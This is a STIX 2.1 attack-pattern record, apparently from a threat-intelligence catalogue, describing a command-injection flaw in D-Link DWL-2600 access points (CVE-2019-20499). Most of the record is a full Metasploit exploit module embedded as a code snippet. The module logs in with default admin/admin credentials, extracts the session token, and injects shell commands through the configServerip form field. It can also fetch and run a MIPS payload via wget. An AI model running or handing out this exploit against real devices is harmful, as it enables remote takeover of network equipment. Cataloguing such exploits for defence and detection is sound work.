{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14d81fe7-3c06-4b54-a548-3a016d2f604a",
    "created": "2024-08-14T17:04:17.567587Z",
    "modified": "2024-08-14T17:04:17.567591Z",
    "name": "DLINK DWL-2600 Authenticated Remote Command Injection",
    "description": " Some DLINK Access Points are vulnerable to an authenticated OS command injection. Default credentials for the web interface are admin/admin. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dwl_2600_command_injection.rb",
            "external_id": "dlink_dwl_2600_command_injection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-20499"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'DLINK DWL-2600 Authenticated Remote Command Injection',\n        'Description' => %q{\n          Some DLINK Access Points are vulnerable to an authenticated OS command injection.\n          Default credentials for the web interface are admin/admin.\n        },\n        'Author' => [\n          'RAKI BEN HAMOUDA', # Vulnerability discovery and original research\n          'Nick Starke' # Metasploit Module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2019-20499' ],\n          [ 'EDB', '46841' ]\n        ],\n        'DisclosureDate' => '2019-05-15',\n        'Privileged' => true,\n        'Platform' => %w[linux unix],\n        'Payload' => {\n          'DisableNops' => true,\n          'BadChars' => \"\\x00\"\n        },\n        'CmdStagerFlavor' => :wget,\n        'Targets' => [\n          [\n            'CMD',\n            {\n              'Arch' => ARCH_CMD,\n              'Platform' => 'unix'\n            }\n          ],\n          [\n            'Linux mips Payload',\n            {\n              'Arch' => ARCH_MIPSLE,\n              'Platform' => 'linux'\n            }\n          ],\n        ],\n        'DefaultTarget' => 1\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'The username to authenticate as', 'admin' ]),\n        OptString.new('HttpPassword', [ true, 'The password for the specified username', 'admin' ]),\n        OptString.new('TARGETURI', [ true, 'Base path to the Dlink web interface', '/' ])\n      ]\n    )\n  end\n\n  def execute_command(cmd, _opts = {})\n    bogus = Rex::Text.rand_text_alpha(rand(10))\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part('up', nil, nil, 'form-data; name=\"optprotocol\"')\n    post_data.add_part(bogus, nil, nil, 'form-data; name=\"configRestore\"')\n    post_data.add_part(\"; #{cmd} ;\", nil, nil, 'form-data; name=\"configServerip\"')\n\n    print_status(\"Sending CGI payload using token: #{@token}\") # Note token is an instance variable now\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin.cgi'),\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => \"sessionHTTP=#{@token};\",\n      'data' => post_data.to_s,\n      'query' => 'action=config_restore'\n    })\n\n    unless res || res.code != 200\n      fail_with(Failure::UnexpectedReply, \"Command wasn't executed, aborting!\")\n    end\n  rescue ::Rex::ConnectionError\n    vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n    return\n  end\n\n  def exploit\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword']\n    rhost = datastore['RHOST']\n    rport = datastore['RPORT']\n\n    print_status(\"#{rhost}:#{rport} - Trying to login with #{user} / #{pass}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/admin.cgi'),\n      'method' => 'POST',\n      'vars_post' => {\n        'i_username' => user,\n        'i_password' => pass,\n        'login' => 'Logon'\n      }\n    })\n\n    unless res && res.code != 404\n      fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n    end\n\n    unless [200, 301, 302].include?(res.code)\n      fail_with(Failure::NoAccess, \"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n    end\n\n    print_good(\"#{rhost}:#{rport} - Successful login #{user}/#{pass}\")\n\n    delstart = 'var cookieValue = \"'\n    tokenoffset = res.body.index(delstart) + delstart.size\n    endoffset = res.body.index('\";', tokenoffset)\n    @token = res.body[tokenoffset, endoffset - tokenoffset]\n\n    if @token.empty?\n      fail_with(Failure::NoAccess, \"#{peer} - No Auth token received\")\n    end\n\n    print_good(\"#{peer} - Received Auth token: #{@token}\")\n    if target.name =~ /CMD/\n      unless datastore['CMD']\n        fail_with(Failure::BadConfig, \"#{rhost}:#{rport} - Only the cmd/generic payload is compatible\")\n      end\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(linemax: 100, noconcat: true)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-05-15",
    "x_mitre_platforms": [
        "linux"
    ]
}